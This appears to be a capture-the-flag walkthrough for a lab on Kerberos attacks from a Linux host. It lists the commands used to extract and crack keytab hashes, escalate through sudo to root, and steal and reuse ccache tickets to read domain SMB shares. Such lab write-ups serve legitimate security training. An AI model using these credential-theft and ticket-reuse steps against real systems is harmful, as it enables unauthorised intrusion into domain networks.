## Connect to the target machine using SSH to the port TCP/2222 and the provided credentials. Read the flag in David's home directory.

```
ssh david@inlanefreight.htb@10.129.13.92 -p 2222
cat flag.txt 
```

## Which group can connect to LINUX01?

```
realm list
```

## Look for a keytab file that you have read and write access. Submit the file name as a response.

```
/opt/specialfiles/carlos.keytab
```

## Extract the hashes from the keytab file you found, crack the password, log in as the user and submit the flag in the user's home directory.

```
klist -k -t  /opt/specialfiles/carlos.keytab
klist
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
smbclient //dc01/carlos -k -c ls
smbclient //dc01/carlos -k -c "get carlos.txt"
cat carlos.txt

python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```
![Снимок экрана 2026-02-02 в 00.24.20](assets/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202026-02-02%20%D0%B2%2000.24.20.png)

```
https://crackstation.net/
```
![Снимок экрана 2026-02-02 в 00.25.47](assets/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202026-02-02%20%D0%B2%2000.25.47.png)

```
su - carlos@inlanefreight.htb
klist
cat flag.txt
```

## Check Carlos' crontab, and look for keytabs to which Carlos has access. Try to get the credentials of the user svc_workstations and use them to authenticate via SSH. Submit the flag.txt in svc_workstations' home directory.
```
cd ..
ls -l
ls svc_workstations@inlanefreight.htb/
cat svc_workstations@inlanefreight.htb/flag.txt
```

```
crontab -l
cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh

```

## Check the sudo privileges of the svc_workstations user and get access as root. Submit the flag in /root/flag.txt directory as the response.

```
ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
Password4
sudo su
cat /root/flag.txt
```

## Check the /tmp directory and find Julio's Kerberos ticket (ccache file). Import the ticket and read the contents of julio.txt from the domain share folder \\DC01\julio.

```
ls -la /tmp
id julio@inlanefreight.htb
klist
cp /tmp/krb5cc_647401106_HRJDux .
export KRB5CCNAME=/root/krb5cc_647401106_HRJDux
klist
smbclient //dc01/C$ -k -c ls -no-pass
smbclient //dc01/julio -k -N -c "get julio.txt"
cat julio.txt
```

## Use the LINUX01$ Kerberos ticket to read the flag found in \\DC01\linux01. Submit the contents as your response (the flag starts with Us1nG_).
```
ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
Password4
sudo su

smbclient //DC01/C$
klist
cd SharedFolder\linux01\
get flag.txt
exit
cat flag.txt

```


## Transfer Julio's ccache file from LINUX01 to your attack host. Follow the example to use chisel and proxychains to connect via evil-winrm from your attack host to MS01 and DC01. Mark DONE when finished.


## From Windows (MS01), export Julio's ticket using Mimikatz or Rubeus. Convert the ticket to ccache and use it from Linux to connect to the C disk. Mark DONE when finished.

